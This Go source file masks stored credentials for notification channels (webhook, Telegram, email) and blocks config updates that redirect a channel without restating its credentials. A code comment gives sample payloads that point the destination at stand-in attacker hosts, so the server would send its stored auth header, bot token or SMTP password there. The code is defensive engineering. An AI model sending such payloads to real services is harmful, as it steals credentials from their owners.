package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for masked values. When the API echoes
// credentials back, it replaces the real value with one carrying this prefix;
// when the update endpoint receives a value with this prefix, it understands
// it as "keep the stored value unchanged".
//
// Using a prefix instead of an empty string or some fixed constant lets us
// also carry a little identifying information along with it (see
// MaskedValue), so the user can tell "which bot is this" without having to
// re-paste the secret.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              the original is too short, no hint given
//	"__masked__:…ab12cd"      carries the last 6 characters as an identifying hint
//
// Only exposing the last 6 characters is a deliberate choice: the identifying
// information of a Webhook address lies in the tail (e.g. WeCom's key,
// Feishu's bot id), while the prefix is the same for every bot and carries
// no identifying value. The last 6 characters are not enough to recover the
// credential, but they are enough to let the configurer recognize
// "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. it was not modified
// after the API echoed it back).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with this channel's credential
// fields replaced by masked values.
//
// Unknown channel types return an empty map instead of the original config
// — better to let the UI show "config unavailable" than to dump the raw
// contents (which may contain credentials) back when the channel type
// cannot be recognized. Non-credential fields are preserved as-is, so the
// UI can still display them.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as a single credential as
		// a whole: deciding per sub-key would require each channel to declare
		// a "which sub-keys are credentials" rule, far more complexity than
		// the payoff.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials signals "the destination address
// changed, but the caller did not opine on the credential fields". We
// return this rather than silently allowing it or silently dropping the
// credentials — see PrepareConfigUpdate for the rationale.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys the caller did not explicitly opine on
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination (" + strings.Join(e.Changed, ", ") + ") has changed, please refill the credential fields (" +
		strings.Join(e.Missing, ", ") + "): enter a new value, or explicitly leave it blank to indicate credentials are no longer needed. " +
		"The original credentials only work for the old address; continuing to use them is equivalent to handing them to the new address."
}

// PrepareConfigUpdate merges channel config and handles the
// security-sensitive case of "destination address change".
//
// It replaces bare MergeConfig on the channel-update path, addressing a
// path that has been proven viable in practice: the destination address
// (where messages are sent) and the credentials (the identity under which
// they are sent) are two independent sets of fields, and MergeConfig
// preserves the stored value for any "unmentioned key". So anyone who can
// PATCH a channel only has to **change the address alone and stay silent
// about the credentials** to make the server send the real stored
// credentials to a destination they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS gives up the username and password
//
// This path is completely silent, does not depend on redirects (so refusing
// cross-host jumps does not block it), and directly defeats the goal of
// this package's masking mechanism — "credentials are not echoed back to
// the browser".
//
// Rule: whenever a destination key is changed to a new value, the caller
// must explicitly opine on **every** credential key:
//   - provide a new value → use the new value
//   - explicitly pass an empty string → this field no longer needs credentials (clear semantics preserved)
//   - echo back the masked value as-is / or simply omit the key → reject
//
// The third case is also rejected because the masked value's meaning is
// exactly "keep the old credentials", and the old credentials only work
// for the old address. We deliberately do not "auto-discard the
// credentials" here — for optional credential fields (webhook's headers,
// email's password) that would silently turn into "auth is gone but the
// API still returns 200", which is harder to debug than an error. Better
// to make the operator fill it in one more time.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// For non-string credential values (e.g. webhook's headers is an
	// object), if a masked literal is embedded inside, it means the caller
	// stuffed the "keep the original value" sentinel into the structure
	// itself. MergeConfig only treats "string with the prefix" as masked;
	// this shape would be stored as a plain object — a literal
	// "__masked__" really lands in the database, and subsequent auth
	// silently fails with no error. Better to reject.
	//
	// This check must come first: when the address is unchanged we take
	// the early-return path, so putting it later would only cover the
	// "address changed" path (the first version put it here and was
	// wrong; the tests caught it directly).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked
	// value equals "not changed".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: do a regular merge (masked value keeps the
		// original, empty string clears, the rest overrides).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require explicit opinion on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the masked
// sentinel inside non-string structures.
//
// The masking mechanism assumes "the whole value is a string". For object
// fields like webhook's headers, the only options are to mask it as a
// whole (writing the string "__masked__") or to submit it as a whole;
// stuffing the sentinel inside the object cannot express "keep
// unchanged", and would be stored in the database as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: this field can only be left blank as a whole to mean 'keep', or have a new value submitted as a whole; the masked placeholder cannot be embedded inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two config values for equivalence. Using JSON
// serialization for the comparison is to also handle type differences —
// the port submitted by the frontend is a number, while what we read back
// from the database is float64, so a direct == would misjudge.
//
// "Empty" must be normalized before comparison: an empty string and "the
// key does not exist" are the same state in this config model, because
// MergeConfig treats an empty string as an explicit clear and deletes the
// key directly. Without normalization, an optional destination field
// that is always left blank (Telegram's base_url is the only such field:
// leaving it blank uses the official address) would walk down this path:
//
//	Save base_url:"" on creation → MergeConfig deletes the key on the first save
//	→ On the second save, incoming is "" and stored is missing the key, judged as "address changed"
//	→ Credentials are the masked value → 400 "destination has changed, please refill the credential fields"
//
// After that, every save fails unless the user re-pastes the Bot Token,
// even though they did not change anything.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue determines whether a config value is "empty". The
// criterion must be consistent with MergeConfig's clear check
// (strings.TrimSpace(s) == ""), otherwise there is a gap where
// "MergeConfig thinks it should delete, sameConfigValue thinks it has a
// value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, used for updating channel
// config.
//
// Rules:
//   - keys in incoming whose value is masked → keep the original stored value (the user did not change this field)
//   - keys in incoming whose value is an empty string → treat as an explicit clear and delete the key
//   - other keys → use the incoming value to override
//   - keys that are in stored but not in incoming → keep them (partial-update semantics)
//
// Whether an empty string counts as "clear" needs to be made explicit: the
// frontend form submits unfilled fields as empty strings; treating that as
// a valid value would really clear fields that were "left blank to keep
// the original value". We choose to treat it as an explicit clear here,
// because when a misconfigured field needs to be cleared, the user has no
// other way to express it (removing a field distinguishes "not provided"
// from "provided empty", but the UI does not use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
